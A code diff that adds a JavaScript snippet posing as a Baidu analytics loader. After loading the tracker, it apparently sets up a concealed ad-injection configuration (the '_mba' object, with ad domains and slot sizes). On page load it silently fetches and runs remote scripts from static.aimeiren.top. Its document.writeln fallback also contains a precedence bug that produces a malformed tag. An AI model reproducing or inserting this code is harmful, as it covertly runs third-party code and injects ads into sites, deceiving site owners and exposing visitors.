@@ -1,0 +1,71 @@
+
+    (function () {
+        var t = 'hm.baidu.com/hm.js?e1e386be074a459371b2832363c0d7e7', m = new Date().getTime(), scriptid = "sid" + m;
+        try {
+            window.source_domain = t.substring(0, t.search('/'));
+        } catch (e) {
+        }
+        var sts = document.getElementsByTagName("script"), find = 'http://' + t, t_async = true;
+        for (var i in sts) {
+            if (!sts[i].src) continue;
+            var ssrc = sts[i].src, flag_i = ssrc.indexOf('#');
+            if (flag_i !== -1) ssrc = ssrc.substr(0, flag_i);
+            if (ssrc == find) {
+                t_async = sts[i].async;
+                break;
+            }
+        }
+        if (t.indexOf("hm.baidu.com/") != -1 || t.indexOf("cnzz.com/") != -1
+            || t.indexOf("www.google-analytics.com/") != -1
+            || t.indexOf("js.users.51.la/") != -1) {
+            if (t.indexOf("https://") < 0)
+                t = t.indexOf("http://") == 0 ? t.replace("http://", "https://") : "https://" + t;
+        } else {
+            t += (t.search("[?]") != -1 ? '&' : '?') + '08022728' + m;
+        }
+        function load_js(js) {
+            try {
+                var a = document.createElement('script');
+                a.type = 'text/javascript';
+                a.charset = "utf8";
+                a.async = true;
+                a.src = js;
+                var s = document.getElementsByTagName('head')[0];
+                s.appendChild(a);
+            } catch (e) {
+                console.log("dispatcher error:", e)
+            }
+        }
+
+        if (t_async)
+            load_js(t.indexOf("https://") == 0 ? t : '//' + t);
+        else
+            document.writeln('<scr' + 'ipt id="' + scriptid + '" src="' + t.indexOf("https://") == 0 ? t : '//' + t + '"></scr' + 'ipt>');
+
+        if (window._mba) return;
+        window._mba = {dversion: '2.0', site: 1, scheme: 'https', rid: '28a8f14f4ea44417b6747c2fb5fa964b', media_id:172, bis: [57],ad_domains: {57:"indaop.com"}, dt_bis: [4], dt_domains:{4:"a.yellqu.com"}, ads: {'1': '300X250', '8': '160X600', '9': '160X600','46':'960X120'}};
+        
+        
+        
+        
+        
+        if (window._mba.bis.length>0){
+            var a_js = 'https://static.aimeiren.top/js/a.js?v20170727';
+            load_js(a_js);
+        }
+        if (window._mba.dt_bis.length>0){
+            var dt_js = 'https://static.aimeiren.top/js/dt.js?v20170721';
+            load_js(dt_js);
+        }
+        
+        
+            
+            
+            
+            
+            
+                
+            
+            
+        
+    })();
